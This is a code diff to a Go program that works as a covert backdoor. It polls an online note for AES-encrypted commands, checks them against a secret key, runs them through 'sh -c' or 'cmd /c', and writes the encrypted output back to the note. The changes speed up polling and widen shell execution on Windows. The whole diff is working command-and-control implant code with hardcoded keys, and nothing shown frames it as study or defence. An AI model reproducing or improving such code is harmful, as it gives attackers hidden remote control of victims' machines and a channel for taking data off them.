@@ -12,13 +12,13 @@ import (
 	"runtime"
 	"strings"
 	"time"
+	// "github.com/google/uuid"
 )
 
 func main() {
-
 	key := []byte("qaxzaiciyiyouuuu")
 	iv := []byte("qaxyydsyydsyydss")
-	noteid := gorand.RandomAlphabetic(30)
+	noteid := gorand.RandomAlphabetic(32)
 	var notekey string
 	var admin string
 	flag.StringVar(&notekey, "key", "zhu1234554321zhu", "加密参数")
@@ -29,11 +29,9 @@ func main() {
 
 	//循环命令执行
 	for {
+		time.Sleep(1 * time.Second)
 		cmdd, err := AesCbcDecryptByBase64(GetNote(noteid), key, iv)
-
 		if err != nil {
-			time.Sleep(10 * time.Second)
-
 			continue
 
 		}
@@ -41,7 +39,7 @@ func main() {
 		if cmd[0] == notekey {
 			var command *exec.Cmd
 			if runtime.GOOS == "windows" {
-				command = exec.Command(cmd[1])
+				command = exec.Command("cmd", "/c", cmd[1])
 			} else {
 				command = exec.Command("sh", "-c", cmd[1])
 
@@ -52,14 +50,14 @@ func main() {
 			command.Run()
 			base64, err := AesCbcEncryptBase64(stdout.Bytes(), key, iv)
 			if err != nil {
-				time.Sleep(10 * time.Second)
+				time.Sleep(3 * time.Second)
 
 				continue
 			}
 			WriteNote(noteid, base64)
 
 		} else {
-			time.Sleep(10 * time.Second)
+			continue
 		}
 
 	}
